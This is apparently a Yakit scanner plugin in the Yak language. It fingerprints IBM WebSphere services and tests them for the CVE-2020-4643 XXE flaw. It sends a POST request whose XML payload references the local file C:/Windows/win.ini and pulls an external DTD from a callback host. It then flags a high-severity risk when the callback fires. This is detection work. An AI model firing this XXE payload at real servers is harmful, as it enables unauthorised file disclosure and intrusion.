# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

token, hostPort, err := risk.NewRandomPortTrigger(risk.type("reverse-http"), risk.typeVerbose("RMI反连"), risk.title("test"))
if err != nil {
    log.info(err.Error())
}
if token == "" {
yakit.Error("未配置 Yak Bridge 作为公网映射，无法获取随机端口")
return
}

log.info("host: %s", hostPort)
log.info("token: %s",token)

handleCheck = func(target,port,hostPort){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST / HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
If-Modified-Since: Wed, 01 Apr 2020 22:01:48 GMT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

<!DOCTYPE x [
<!ENTITY % aaa SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY % bbb SYSTEM "http://{{params(hostPort)}}/xx.dtd">
%bbb;
]>
<definitions name="HelloService" xmlns="http://schemas.xmlsoap.org/wsdl/">
&ddd;
</definitions>`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"hostPort":hostPort}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    sleep(3)
    
    data, err = risk.CheckRandomTriggerByToken(token)
    if err != nil {
        return
    }

    // dump(rsp)
    if len(rsp) > 0 {
        if data != nil {
            yakit.Info("%v IBM WebSphere Application Server XXE 漏洞 CVE-2020-4643", addr)
            risk.NewRisk(
                addr,risk.title("IBM WebSphere Application Server XXE 漏洞 CVE-2020-4643"),
                risk.severity("high"),
                risk.titleVerbose("IBM WebSphere Application Server XXE 漏洞 CVE-2020-4643存在"),
                risk.type("反序列化[Websphere]"),
                risk.token(token),
            )
        }
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.GetServiceName(), "websphere") {
            handleCheck(result.Target,result.Port,hostPort)  
        }
    }
    
}
